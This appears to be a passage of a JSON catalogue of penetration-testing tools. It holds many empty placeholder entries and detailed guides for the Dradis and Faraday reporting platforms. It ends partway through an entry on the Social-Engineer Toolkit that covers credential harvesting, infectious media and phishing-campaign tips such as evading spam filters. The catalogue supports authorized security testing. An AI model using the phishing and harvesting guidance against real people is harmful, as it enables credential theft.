    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "ettercap",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "driftnet",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "dsniff",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "mitmproxy",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "bettercap",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "sbd",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "cryptcat",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "dnscat2",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "steghide",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "outguess",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "exiftool",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "binwalk",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "foremost",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "strings",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "scalpel",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "bulk_extractor",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "xxd",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "hexedit",
    "name": "Unknown Tool",
    "summary": "No instructions are available for this tool yet.",
    "installation_guides": [],
    "quick_examples": [],
    "common_flags": [],
    "operational_tips": [],
    "step_sequences": [],
    "workflow_guides": [],
    "output_notes": [],
    "advanced_usage": [],
    "comparison_table": null,
    "resources": []
  },
  {
    "id": "dradis",
    "name": "Dradis",
    "summary": "Dradis is an open-source collaboration and reporting platform designed for security professionals. It centralizes findings from multiple tools, enables team collaboration, and generates professional reports for penetration testing engagements.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via Ruby gems or use the CE (Community Edition) package.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git ruby ruby-dev build-essential libsqlite3-dev nodejs",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/dradis/dradis-ce.git",
            "copyable": true
          },
          {
            "detail": "cd dradis-ce && gem install bundler && bundle install",
            "copyable": true
          },
          {
            "detail": "bundle exec rails server",
            "copyable": true
          },
          {
            "detail": "# Access Dradis at http://localhost:3000",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed on Kali or install via gem with dependencies.",
        "steps": [
          {
            "detail": "dradis &",
            "copyable": true
          },
          {
            "detail": "# Access at http://localhost:3004",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run Dradis CE in containerized environment for isolation.",
        "steps": [
          {
            "detail": "docker pull dradis/dradis-ce",
            "copyable": true
          },
          {
            "detail": "docker run -d -p 3000:3000 dradis/dradis-ce",
            "copyable": true
          },
          {
            "detail": "# Access at http://localhost:3000",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Dradis Professional",
        "summary": "Commercial Pro/Teams edition with advanced features and support.",
        "steps": [
          {
            "detail": "# Download from https://dradisframework.com/pro/",
            "copyable": false
          },
          {
            "detail": "# Follow installation wizard for Pro edition",
            "copyable": false
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start Dradis server",
        "command": "bundle exec rails server",
        "notes": []
      },
      {
        "description": "Import Nmap XML scan",
        "command": "# Upload > Import from file > Select nmap.xml",
        "notes": []
      },
      {
        "description": "Create new project",
        "command": "# Projects > New Project > Enter name and details",
        "notes": []
      },
      {
        "description": "Export findings report",
        "command": "# Export > Select template > Generate report",
        "notes": []
      }
    ],
    "common_flags": [],
    "operational_tips": [
      "Create separate projects for each engagement or client.",
      "Use templates to standardize finding formats and methodologies.",
      "Import tool outputs early to avoid manual data entry.",
      "Tag findings with CVSS scores and remediation priorities.",
      "Collaborate with team members using notes and comments.",
      "Export reports in multiple formats (HTML, PDF, Word) for client delivery.",
      "Backup projects regularly; database corruption can occur.",
      "Use attachments to include screenshots and evidence files.",
      "Customize report templates to match organizational branding.",
      "Pro edition offers real-time collaboration and advanced integrations."
    ],
    "step_sequences": [
      {
        "title": "Project setup and tool import workflow",
        "steps": [
          {
            "title": "Create new project",
            "details": "Initialize project workspace for engagement.",
            "command": "# Projects > New Project > Name: Client Pentest 2024"
          },
          {
            "title": "Define project structure",
            "details": "Organize nodes representing networks, hosts, and services.",
            "command": "# Add nodes: Network > Hosts > Services"
          },
          {
            "title": "Import Nmap results",
            "details": "Upload Nmap XML to automatically populate hosts and services.",
            "command": "# Upload > Import from File > nmap_scan.xml"
          },
          {
            "title": "Import Nessus scan",
            "details": "Add vulnerability data from Nessus or OpenVAS.",
            "command": "# Upload > Import from File > nessus_scan.nessus"
          },
          {
            "title": "Import Burp/ZAP findings",
            "details": "Merge web application vulnerabilities into project.",
            "command": "# Upload > Import from File > burp_report.xml or zap_report.xml"
          },
          {
            "title": "Review imported data",
            "details": "Verify all findings populated correctly in project tree.",
            "command": "# Navigate nodes to review hosts, services, vulnerabilities"
          }
        ]
      },
      {
        "title": "Manual finding documentation",
        "steps": [
          {
            "title": "Create new note",
            "details": "Document manual findings not captured by automated tools.",
            "command": "# Select node > New Note"
          },
          {
            "title": "Use templates",
            "details": "Apply predefined templates for common vulnerability types.",
            "command": "# Note editor > Apply template: SQL Injection, XSS, etc."
          },
          {
            "title": "Add evidence",
            "details": "Attach screenshots, code snippets, and proof-of-concept.",
            "command": "# Note editor > Attachments > Upload files"
          },
          {
            "title": "Set severity and CVSS",
            "details": "Assign risk ratings using CVSS calculator or custom scale.",
            "command": "# Note fields > Severity: Critical/High/Medium/Low, CVSS Score"
          },
          {
            "title": "Include remediation",
            "details": "Provide actionable recommendations for fixing vulnerability.",
            "command": "# Remediation field > Detailed fix instructions"
          }
        ]
      },
      {
        "title": "Team collaboration workflow",
        "steps": [
          {
            "title": "Invite team members",
            "details": "Add collaborators to project with appropriate permissions.",
            "command": "# Project Settings > Team > Invite users"
          },
          {
            "title": "Assign findings",
            "details": "Delegate verification or testing tasks to team members.",
            "command": "# Note > Assign to: TeamMember"
          },
          {
            "title": "Add comments",
            "details": "Collaborate via threaded comments on findings.",
            "command": "# Note > Comments > Add comment"
          },
          {
            "title": "Track status",
            "details": "Update finding status as testing progresses.",
            "command": "# Note > Status: New, In Progress, Verified, False Positive"
          },
          {
            "title": "Review before reporting",
            "details": "Team lead reviews all findings before report generation.",
            "command": "# Filter by Status: Ready for Report"
          }
        ]
      },
      {
        "title": "Report generation and export",
        "steps": [
          {
            "title": "Select report template",
            "details": "Choose from built-in or custom report templates.",
            "command": "# Export > Select template: Executive Summary, Technical Report, Compliance"
          },
          {
            "title": "Configure report options",
            "details": "Set scope, include/exclude findings, customize sections.",
            "command": "# Report options > Include: Executive Summary, Findings, Appendices"
          },
          {
            "title": "Generate report",
            "details": "Export report in desired format (HTML, Word, PDF).",
            "command": "# Export > Generate > Download report"
          },
          {
            "title": "Review and edit",
            "details": "Proofread exported report and make manual edits if needed.",
            "command": "# Open exported document, review formatting and content"
          },
          {
            "title": "Deliver to client",
            "details": "Package report with executive summary and technical appendices.",
            "command": "# Compile final deliverables for client handoff"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "End-to-end penetration test reporting",
        "stages": [
          {
            "label": "Project initialization",
            "description": "Create project structure and define scope.",
            "command": "# New Project > Define networks, hosts, applications in scope"
          },
          {
            "label": "Tool output aggregation",
            "description": "Import results from Nmap, Nessus, Burp, Metasploit, etc.",
            "command": "# Upload > Import multiple tool outputs"
          },
          {
            "label": "Manual testing documentation",
            "description": "Add findings from manual testing and exploitation.",
            "command": "# Create notes with templates, attach evidence"
          },
          {
            "label": "Collaborative review",
            "description": "Team validates findings, removes false positives.",
            "command": "# Team reviews, comments, updates statuses"
          },
          {
            "label": "Report generation",
            "description": "Produce executive and technical reports.",
            "command": "# Export > Generate reports for stakeholders"
          }
        ]
      },
      {
        "name": "Continuous engagement tracking",
        "stages": [
          {
            "label": "Create baseline project",
            "description": "Document initial security posture.",
            "command": "# New Project > Baseline Assessment Q1"
          },
          {
            "label": "Import quarterly scans",
            "description": "Add new findings from ongoing assessments.",
            "command": "# Upload > Import Q2, Q3, Q4 scan results"
          },
          {
            "label": "Track remediation",
            "description": "Update finding statuses as vulnerabilities are fixed.",
            "command": "# Update Status: Fixed, Mitigated, Accepted"
          },
          {
            "label": "Generate trend reports",
            "description": "Show security improvement over time.",
            "command": "# Export > Trend report comparing quarters"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Import successful: 247 nodes added",
        "meaning": "Tool output imported correctly; review node tree for completeness.",
        "severity": "info"
      },
      {
        "indicator": "Export complete: report.html generated",
        "meaning": "Report successfully created; download and review before delivery.",
        "severity": "info"
      },
      {
        "indicator": "Database migration required",
        "meaning": "Dradis version updated; run migrations to update database schema.",
        "severity": "warning"
      },
      {
        "indicator": "Attachment upload failed",
        "meaning": "File size or type restriction; check configuration or resize image.",
        "severity": "error"
      }
    ],
    "advanced_usage": [
      {
        "title": "Custom report templates",
        "scenario": "Create branded report templates with organizational styling.",
        "command": "# Templates > New Template > Edit HTML/ERB template files",
        "notes": [
          "Templates use ERB (Embedded Ruby) for dynamic content.",
          "Customize CSS for branding and layout.",
          "Test templates with sample projects before production use."
        ]
      },
      {
        "title": "API integration for automation",
        "scenario": "Automate project creation and finding import via REST API.",
        "command": "curl -X POST http://localhost:3000/api/projects -H 'Authorization: Bearer TOKEN' -d '{\"project\":{\"name\":\"Auto Project\"}}'",
        "notes": [
          "Generate API tokens in user settings.",
          "Automate report generation in CI/CD pipelines.",
          "Integrate with ticketing systems for vulnerability tracking."
        ]
      },
      {
        "title": "Custom plugin development",
        "scenario": "Create plugins to import proprietary tool formats.",
        "command": "# Develop Ruby plugin following Dradis plugin architecture",
        "notes": [
          "Study existing plugins in /app/uploaders/ directory.",
          "Implement upload and parsing methods for custom format.",
          "Test plugin thoroughly before deploying to production."
        ]
      },
      {
        "title": "Database backup and migration",
        "scenario": "Regular backups to prevent data loss during upgrades.",
        "command": "bundle exec rake db:backup && bundle exec rake db:migrate",
        "notes": [
          "Schedule automated backups before upgrades.",
          "Store backups on separate infrastructure.",
          "Test restore procedures periodically."
        ]
      }
    ],
    "comparison_table": {
      "title": "Dradis CE vs Professional",
      "headers": ["Feature", "Community Edition", "Professional"],
      "rows": [
        ["Price", "Free & Open Source", "$499+/user/year"],
        ["Tool integrations", "20+ importers", "30+ importers"],
        ["Real-time collaboration", "", ""],
        ["Advanced reporting", "Basic templates", "Advanced + custom"],
        ["Support", "Community forums", "Professional support"],
        ["API access", "Limited", "Full REST API"],
        ["Compliance templates", "Basic", "PCI-DSS, HIPAA, ISO 27001"],
        ["User management", "Basic", "RBAC, LDAP, SSO"]
      ]
    },
    "resources": [
      {
        "label": "Official Documentation",
        "url": "https://dradisframework.com/support/guides/",
        "description": "User guides and administrator documentation."
      },
      {
        "label": "GitHub Repository",
        "url": "https://github.com/dradis/dradis-ce",
        "description": "Community Edition source code and issue tracker."
      },
      {
        "label": "Plugin Directory",
        "url": "https://dradisframework.com/integrations/",
        "description": "Browse available tool integrations and plugins."
      }
    ]
  },
  {
    "id": "faraday",
    "name": "Faraday",
    "summary": "Faraday is an Integrated Penetration-Test Environment (IPE) that combines security tools, manages vulnerabilities, enables team collaboration, and integrates with numerous pentesting tools for centralized workspace management.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via pip or Debian package for system-wide deployment.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y python3-pip python3-venv postgresql",
            "copyable": true
          },
          {
            "detail": "pip3 install faradaysec",
            "copyable": true
          },
          {
            "detail": "sudo systemctl start postgresql && sudo systemctl enable postgresql",
            "copyable": true
          },
          {
            "detail": "faraday-manage initdb",
            "copyable": true
          },
          {
            "detail": "faraday-server",
            "copyable": true
          },
          {
            "detail": "# Access web UI at http://localhost:5985",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed or installable via apt with full dependencies.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y faraday",
            "copyable": true
          },
          {
            "detail": "sudo systemctl start postgresql",
            "copyable": true
          },
          {
            "detail": "faraday-manage initdb",
            "copyable": true
          },
          {
            "detail": "faraday-server &",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run Faraday in containerized environment with persistence.",
        "steps": [
          {
            "detail": "docker pull faradaysec/faraday",
            "copyable": true
          },
          {
            "detail": "docker run -d -p 5985:5985 -v faraday_data:/home/faraday/.faraday faradaysec/faraday",
            "copyable": true
          },
          {
            "detail": "# Access at http://localhost:5985",
            "copyable": false
          }
        ]
      },
      {
        "platform": "Commercial/Enterprise",
        "summary": "Faraday Professional with advanced features and support.",
        "steps": [
          {
            "detail": "# Contact https://www.faradaysec.com for enterprise licensing",
            "copyable": false
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Start Faraday server",
        "command": "faraday-server",
        "notes": []
      },
      {
        "description": "Create new workspace",
        "command": "# Web UI > Workspaces > New Workspace",
        "notes": []
      },
      {
        "description": "Import Nmap scan",
        "command": "# Workspace > Import > Upload nmap.xml",
        "notes": []
      },
      {
        "description": "Run tool with Faraday plugin",
        "command": "faraday-cli tool run nmap -sV -oX - target.com",
        "notes": []
      }
    ],
    "common_flags": [],
    "operational_tips": [
      "Use workspaces to separate different engagements and clients.",
      "Leverage native tool plugins for automatic import (nmap, nikto, burp, etc.).",
      "Tag vulnerabilities for easy filtering and reporting.",
      "Enable Faraday agent for real-time tool output capture.",
      "Integrate with Metasploit for exploit management.",
      "Export findings to CSV, JSON, or XML for external processing.",
      "Use custom fields to track CVSS, remediation status, or compliance.",
      "Professional edition offers API, LDAP, SSO, and advanced analytics.",
      "Set up PostgreSQL properly for multi-user collaboration.",
      "Regular backups are critical; Faraday stores all data in PostgreSQL."
    ],
    "step_sequences": [
      {
        "title": "Initial setup and workspace creation",
        "steps": [
          {
            "title": "Initialize database",
            "details": "Create PostgreSQL database and tables for Faraday.",
            "command": "faraday-manage initdb"
          },
          {
            "title": "Create admin user",
            "details": "Set up initial administrator account.",
            "command": "faraday-manage create-superuser"
          },
          {
            "title": "Start Faraday server",
            "details": "Launch web server for GUI access.",
            "command": "faraday-server"
          },
          {
            "title": "Access web interface",
            "details": "Open browser and log in to Faraday.",
            "command": "# Navigate to http://localhost:5985"
          },
          {
            "title": "Create workspace",
            "details": "Set up isolated workspace for engagement.",
            "command": "# Dashboard > Workspaces > New > Name: Client Pentest"
          }
        ]
      },
      {
        "title": "Tool integration and data import",
        "steps": [
          {
            "title": "Install Faraday client",
            "details": "Install client for command-line tool integration.",
            "command": "pip install faraday-client"
          },
          {
            "title": "Configure client",
            "details": "Connect client to Faraday server and select workspace.",
            "command": "faraday-cli auth -f http://localhost:5985 -u admin -p password"
          },
          {
            "title": "Run tools with automatic import",
            "details": "Execute pentesting tools with Faraday plugins enabled.",
            "command": "faraday-cli tool run nmap -sV -A target.com"
          },
          {
            "title": "Manual import from files",
            "details": "Upload tool reports via web UI for parsing.",
            "command": "# Workspace > Data > Import Reports > Upload files"
          },
          {
            "title": "Review imported data",
            "details": "Verify hosts, services, and vulnerabilities were imported.",
            "command": "# Hosts, Services, Vulnerabilities tabs"
          }
        ]
      },
      {
        "title": "Vulnerability management",
        "steps": [
          {
            "title": "Review vulnerabilities",
            "details": "Examine discovered vulnerabilities sorted by severity.",
            "command": "# Vulnerabilities tab > Sort by Severity"
          },
          {
            "title": "Create manual vulnerability",
            "details": "Document findings not captured by tools.",
            "command": "# Vulnerabilities > New > Fill template fields"
          },
          {
            "title": "Add evidence",
            "details": "Attach screenshots, logs, and proof-of-concept.",
            "command": "# Vulnerability detail > Attachments > Upload"
          },
          {
            "title": "Set remediation status",
            "details": "Track vulnerability lifecycle from discovery to fix.",
            "command": "# Vulnerability > Status: Open, In Progress, Fixed, Risk Accepted"
          },
          {
            "title": "Tag and categorize",
            "details": "Apply tags for filtering and grouping.",
            "command": "# Vulnerability > Tags: Web, Network, Critical, OWASP Top 10"
          }
        ]
      },
      {
        "title": "Team collaboration workflow",
        "steps": [
          {
            "title": "Create team members",
            "details": "Add user accounts with appropriate roles.",
            "command": "# Admin > Users > New User > Set role: Pentester, Admin, Client"
          },
          {
            "title": "Share workspace",
            "details": "Grant access to workspace for collaboration.",
            "command": "# Workspace Settings > Members > Add users"
          },
          {
            "title": "Assign vulnerabilities",
            "details": "Delegate testing or verification to team members.",
            "command": "# Vulnerability > Owner: Assign to team member"
          },
          {
            "title": "Comment and discuss",
            "details": "Use comments for collaborative analysis.",
            "command": "# Vulnerability > Comments > Add notes"
          }
        ]
      },
      {
        "title": "Reporting and export",
        "steps": [
          {
            "title": "Generate vulnerability report",
            "details": "Create comprehensive report from workspace data.",
            "command": "# Reports > Generate > Select template and filters"
          },
          {
            "title": "Export to external format",
            "details": "Download data in CSV, JSON, or XML for processing.",
            "command": "# Data > Export > Format: CSV/JSON/XML"
          },
          {
            "title": "Executive dashboard",
            "details": "View high-level metrics and trends.",
            "command": "# Dashboard shows vulnerability distribution, severity stats"
          },
          {
            "title": "Custom reports via API",
            "details": "Use REST API for programmatic report generation.",
            "command": "curl -H 'Authorization: Token YOUR_TOKEN' http://localhost:5985/api/v2/ws/workspace_name/vulns"
          }
        ]
      }
    ],
    "workflow_guides": [
      {
        "name": "Complete penetration test workflow",
        "stages": [
          {
            "label": "Workspace initialization",
            "description": "Create workspace, configure scope, add team members.",
            "command": "# New Workspace > Configure > Invite team"
          },
          {
            "label": "Reconnaissance phase",
            "description": "Run discovery scans with automatic Faraday import.",
            "command": "faraday-cli tool run nmap -sn 192.168.1.0/24"
          },
          {
            "label": "Vulnerability scanning",
            "description": "Execute vulnerability scanners and import results.",
            "command": "faraday-cli tool run nmap -sV --script vuln 192.168.1.0/24"
          },
          {
            "label": "Manual testing",
            "description": "Document manual findings, add evidence, set severity.",
            "command": "# Create vulnerabilities via web UI, attach PoCs"
          },
          {
            "label": "Remediation tracking",
            "description": "Update statuses as client fixes vulnerabilities.",
            "command": "# Update vulnerability statuses during retesting"
          },
          {
            "label": "Final reporting",
            "description": "Generate reports and export findings.",
            "command": "# Reports > Generate final deliverables"
          }
        ]
      },
      {
        "name": "Continuous assessment with Faraday",
        "stages": [
          {
            "label": "Baseline workspace",
            "description": "Create initial assessment workspace.",
            "command": "# Workspace: Q1 Baseline Assessment"
          },
          {
            "label": "Scheduled scanning",
            "description": "Automate recurring scans via cron or CI/CD.",
            "command": "# Cron job: faraday-cli tool run nmap -sV targets.txt"
          },
          {
            "label": "Trend analysis",
            "description": "Compare vulnerability counts over time.",
            "command": "# Dashboard shows trends across time periods"
          },
          {
            "label": "Remediation verification",
            "description": "Re-scan to confirm fixes were effective.",
            "command": "# Update statuses based on retest results"
          }
        ]
      },
      {
        "name": "Tool chain integration",
        "stages": [
          {
            "label": "Reconnaissance tools",
            "description": "Integrate nmap, masscan, amass for discovery.",
            "command": "faraday-cli tool run amass enum -d example.com"
          },
          {
            "label": "Web scanners",
            "description": "Import Burp, ZAP, Nikto, wpscan reports.",
            "command": "# Import burp_scan.xml, zap_report.xml"
          },
          {
            "label": "Exploitation frameworks",
            "description": "Connect Metasploit workspace to Faraday.",
            "command": "# Metasploit: load faraday; faraday_use workspace_name"
          },
          {
            "label": "Specialized tools",
            "description": "Import SQLMap, Nessus, OpenVAS outputs.",
            "command": "# Import tool outputs via web UI or CLI"
          }
        ]
      }
    ],
    "output_notes": [
      {
        "indicator": "Successfully imported 152 vulnerabilities",
        "meaning": "Tool output parsed and added to workspace; review for accuracy.",
        "severity": "info"
      },
      {
        "indicator": "Connection to Faraday server failed",
        "meaning": "Server not running or network issue; check faraday-server status.",
        "severity": "error"
      },
      {
        "indicator": "Workspace created: ClientPentest2024",
        "meaning": "New workspace ready for data import and collaboration.",
        "severity": "info"
      },
      {
        "indicator": "Authentication required",
        "meaning": "API token or credentials needed; run faraday-cli auth.",
        "severity": "warning"
      }
    ],
    "advanced_usage": [
      {
        "title": "REST API for automation",
        "scenario": "Programmatically manage workspaces, vulnerabilities, and reports.",
        "command": "curl -X POST -H 'Authorization: Token YOUR_TOKEN' -H 'Content-Type: application/json' -d '{\"name\":\"New Vuln\",\"severity\":\"high\"}' http://localhost:5985/api/v2/ws/workspace/vulns",
        "notes": [
          "Generate API token in user profile settings.",
          "Full API documentation available at /api/doc.",
          "Automate vulnerability creation, updates, and exports."
        ]
      },
      {
        "title": "Custom tool plugins",
        "scenario": "Create parsers for proprietary or unsupported tools.",
        "command": "# Develop Python plugin following Faraday plugin structure in faraday_plugins/",
        "notes": [
          "Study existing plugins for XML/JSON parsing examples.",
          "Implement Plugin class with parseOutputString method.",
          "Test plugin with sample tool outputs before deployment."
        ]
      },
      {
        "title": "Metasploit integration",
        "scenario": "Synchronize Metasploit workspace with Faraday for exploit management.",
        "command": "msf> load faraday\nmsf> faraday_use workspace_name",
        "notes": [
          "Install faraday-plugins gem in Metasploit environment.",
          "All Metasploit findings automatically sync to Faraday.",
          "View exploited hosts and sessions in Faraday web UI."
        ]
      },
      {
        "title": "LDAP/SSO integration (Professional)",
        "scenario": "Enterprise authentication for team deployments.",
        "command": "# Configure LDAP in server.ini: [ldap] section",
        "notes": [
          "Professional edition required for LDAP/SSO.",
          "Centralize user management with Active Directory.",
          "Configure role mappings for automatic permissions."
        ]
      },
      {
        "title": "Custom fields and compliance mapping",
        "scenario": "Track compliance requirements (PCI-DSS, HIPAA, etc.) per vulnerability.",
        "command": "# Admin > Custom Fields > Add field: Compliance_Requirement",
        "notes": [
          "Create dropdown fields for compliance frameworks.",
          "Filter and report by compliance tags.",
          "Export compliance-specific reports for auditors."
        ]
      }
    ],
    "comparison_table": {
      "title": "Faraday Community vs Professional",
      "headers": ["Feature", "Community", "Professional"],
      "rows": [
        ["Price", "Free & Open Source", "$990+/user/year"],
        ["Multi-user support", "", " Enhanced"],
        ["Tool integrations", "60+ plugins", "80+ plugins"],
        ["REST API", " Full", " Full"],
        ["LDAP/SSO", "", ""],
        ["Advanced analytics", "Basic", " Advanced dashboards"],
        ["Compliance reports", "Basic", "PCI-DSS, HIPAA, ISO 27001"],
        ["Support", "Community", "Professional SLA"]
      ]
    },
    "resources": [
      {
        "label": "Official Documentation",
        "url": "https://docs.faradaysec.com/",
        "description": "User guides, API docs, and plugin development."
      },
      {
        "label": "GitHub Repository",
        "url": "https://github.com/infobyte/faraday",
        "description": "Community edition source code and issues."
      },
      {
        "label": "Plugin Repository",
        "url": "https://github.com/infobyte/faraday_plugins",
        "description": "Tool parser plugins for Faraday integration."
      }
    ]
  },
  {
    "id": "setoolkit",
    "name": "Social Engineer Toolkit (SET)",
    "summary": "The Social-Engineer Toolkit (SET) is an open-source Python-driven framework designed for simulating social engineering attacks including spear phishing, credential harvesting, infectious media, and payload delivery for security awareness training and authorized penetration testing.",
    "installation_guides": [
      {
        "platform": "Debian/Ubuntu",
        "summary": "Install via official repository or clone from GitHub.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y git python3 python3-pip",
            "copyable": true
          },
          {
            "detail": "git clone https://github.com/trustedsec/social-engineer-toolkit/ setoolkit/",
            "copyable": true
          },
          {
            "detail": "cd setoolkit && pip3 install -r requirements.txt",
            "copyable": true
          },
          {
            "detail": "sudo python3 setup.py install",
            "copyable": true
          },
          {
            "detail": "setoolkit",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Kali Linux",
        "summary": "Pre-installed on Kali; update regularly for latest attack vectors.",
        "steps": [
          {
            "detail": "sudo apt update && sudo apt install -y set",
            "copyable": true
          },
          {
            "detail": "setoolkit",
            "copyable": true
          }
        ]
      },
      {
        "platform": "Docker / Alternative",
        "summary": "Run SET in isolated container for campaign management.",
        "steps": [
          {
            "detail": "docker pull trustedsec/social-engineer-toolkit",
            "copyable": true
          },
          {
            "detail": "docker run -it --net=host trustedsec/social-engineer-toolkit",
            "copyable": true
          }
        ]
      }
    ],
    "quick_examples": [
      {
        "description": "Launch SET interactive menu",
        "command": "setoolkit",
        "notes": []
      },
      {
        "description": "Credential harvester attack",
        "command": "# SET > Social-Engineering Attacks > Website Attack Vectors > Credential Harvester",
        "notes": []
      },
      {
        "description": "Infectious media generator",
        "command": "# SET > Social-Engineering Attacks > Infectious Media Generator",
        "notes": []
      },
      {
        "description": "Mass mailer for spear phishing",
        "command": "# SET > Social-Engineering Attacks > Spear-Phishing Attack Vectors > Mass Email",
        "notes": []
      }
    ],
    "common_flags": [],
    "operational_tips": [
      "Always obtain explicit written authorization before running SET campaigns.",
      "Use dedicated infrastructure with clean IP reputation for phishing simulations.",
      "Test email templates against spam filters before mass deployment.",
      "Educate targets after campaigns to improve security awareness.",
      "Use realistic scenarios based on client's industry and threats.",
      "Document all campaign parameters for reproducibility and reporting.",
      "Clean up payloads, web servers, and email infrastructure after completion.",
      "Monitor campaign metrics: open rates, click rates, credential submission.",
      "Combine with payload frameworks like Metasploit for full exploitation chains.",
      "Be aware of legal implications; misuse can result in criminal charges."
    ],
    "step_sequences": [
      {
        "title": "Credential harvesting website attack",
        "steps": [
          {
            "title": "Launch SET",
            "details": "Start Social Engineer Toolkit interactive menu.",
            "command": "setoolkit"
          },
          {
            "title": "Select attack vector",
            "details": "Choose Website Attack Vectors from main menu.",
            "command": "# 1) Social-Engineering Attacks\n# 2) Website Attack Vectors\n# 3) Credential Harvester Attack Method"
          },
